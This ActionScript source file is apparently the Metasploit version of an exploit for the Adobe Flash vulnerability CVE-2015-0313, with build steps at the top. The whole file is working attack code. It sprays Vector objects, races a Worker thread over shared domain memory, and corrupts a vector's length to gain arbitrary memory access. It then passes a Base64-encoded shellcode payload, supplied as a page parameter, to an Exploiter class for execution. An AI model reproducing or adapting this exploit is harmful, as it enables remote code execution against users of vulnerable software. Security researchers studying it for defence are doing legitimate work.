// Build how to:
// 1. Download the AIRSDK, and use its compiler.
// 2. Be support to support 16.0 as target-player (flex-config.xml).
// 3. Download the Flex SDK (4.6)
// 4. Copy the Flex SDK libs (<FLEX_SDK>/framework/libs) to the AIRSDK folder (<AIR_SDK>/framework/libs)
//      (all of them, also, subfolders, specially mx, necessary for the Base64Decoder)
// 5. Build with: mxmlc -o msf.swf Main.as

// Original code by @hdarwin89 // http://hacklab.kr/flash-cve-2015-0313-%EB%B6%84%EC%84%9D/
// Modified to be used from msf
package
{
import flash.display.Sprite
import flash.display.LoaderInfo
import flash.events.Event
import flash.utils.ByteArray
import flash.system.Worker
import flash.system.WorkerDomain
import flash.system.MessageChannel
import flash.system.ApplicationDomain
import avm2.intrinsics.memory.casi32
import mx.utils.Base64Decoder

public class Exploit extends Sprite
{
    private var ov:Vector.<Object> = new Vector.<Object>(80000)
    private var uv:Vector.<uint>
    private var ba:ByteArray = new ByteArray()
    private var worker:Worker
    private var mc:MessageChannel
    private var b64:Base64Decoder = new Base64Decoder()
    private var payload:ByteArray
    private var platform:String
    private var os:String
	private var exploiter:Exploiter

    public function Exploit()
    {
        if (Worker.current.isPrimordial) mainThread()
        else workerThread()
    }

    private function mainThread():void
    {
        platform = LoaderInfo(this.root.loaderInfo).parameters.pl
        os = LoaderInfo(this.root.loaderInfo).parameters.os
        var b64_payload:String = LoaderInfo(this.root.loaderInfo).parameters.sh
        var pattern:RegExp = / /g;
        b64_payload = b64_payload.replace(pattern, "+")
        b64.decode(b64_payload)
        payload = b64.toByteArray()

        ba.length = 0x1000
        ba.shareable = true
        for (var i:uint = 0; i < ov.length; i++) {
            ov[i] = new Vector.<uint>(1014)
            ov[i][0] = 0xdeedbeef
        }
        for (i = 0; i < 70000; i += 2) {
			delete(ov[i])
		}
        worker = WorkerDomain.current.createWorker(this.loaderInfo.bytes)
        mc = worker.createMessageChannel(Worker.current)
        mc.addEventListener(Event.CHANNEL_MESSAGE, onMessage)
        worker.setSharedProperty("mc", mc)
        worker.setSharedProperty("ba", ba)
        ApplicationDomain.currentDomain.domainMemory = ba
        worker.start()
    }

    private function workerThread():void
    {
        var ba:ByteArray = Worker.current.getSharedProperty("ba")
        var mc:MessageChannel = Worker.current.getSharedProperty("mc")
        ba.clear()
        ov[0] = new Vector.<uint>(1022)
        mc.send("")
        while (mc.messageAvailable);
        for (var i:uint = 0;; i++) {
        	if (ov[0][i] == 1014 && ov[0][i + 2] == 0xdeedbeef) {
				ov[0][i] = 0xffffffff
				break
        	}
        }
		ov[0][0xfffffffe] = 1014
        mc.send("")
    }

    private function onMessage(e:Event):void
    {
        var mod:uint = casi32(0, 1022, 0xFFFFFFFF)
		Logger.log("[*] Exploit - onMessage(): mod: " + mod.toString())
        if (mod == 1022) mc.receive()
        else {			
	        for (var i:uint = 0; i < ov.length; i++) {
	            if (ov[i].length == 0xffffffff) {
					uv = ov[i]
				} else {
					if (ov[i] != null) {
						delete(ov[i])
						ov[i] = null
					}
				}
	        }
			if (uv == null) {
				Logger.log("[!] Exploit - onMessage(): Corrupted Vector not found")
				return
			}
			exploiter = new Exploiter(this, platform, os, payload, uv)
        }
    }
}
}